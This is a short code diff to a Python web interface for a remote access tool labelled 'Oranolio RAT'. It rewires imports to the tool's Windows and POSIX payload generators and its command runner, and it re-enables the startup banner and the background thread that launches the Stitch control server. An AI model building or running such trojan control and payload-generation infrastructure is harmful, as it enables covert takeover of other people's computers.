@@ -36,14 +36,16 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 sys.path.insert(0, os.path.dirname(__file__))
 # Import specific functions from Application modules
 from Application.Stitch_Vars.globals import (
-    stitch_version, stitch_config, default_config
+    banner as stitch_version, st_config as stitch_config
 )
+# Define default_config if not available
+default_config = {}
 from Application import stitch_cmd, stitch_lib
 from Application.stitch_utils import (
-    get_connection_status, validate_connection, format_output
+    run_command, st_print
 )
 from Application.stitch_gen import (
-    generate_payload, compile_payload, get_payload_config
+    win_gen_payload, posix_gen_payload, run_exe_gen
 )
 from ssl_utils import get_ssl_context
 
@@ -2928,10 +2930,9 @@ def start_stitch_server():
 # Main
 # ============================================================================
 if __name__ == '__main__':
-    pass
-    # print("\n" + "="*75)
-    # print("🔐 Oranolio RAT - Secure Web Interface")
-    # print("="*75 + "\n")
+    print("\n" + "="*75)
+    print("🔐 Oranolio RAT - Secure Web Interface")
+    print("="*75 + "\n")
     
     # Ensure credentials are loaded (may already be loaded at module level)
     try:
@@ -3001,7 +3002,6 @@ if __name__ == '__main__':
 
     # Start background threads only when running as main
     if __name__ == '__main__':
-        pass
         # Start Stitch server in background
         stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
         stitch_thread.start()
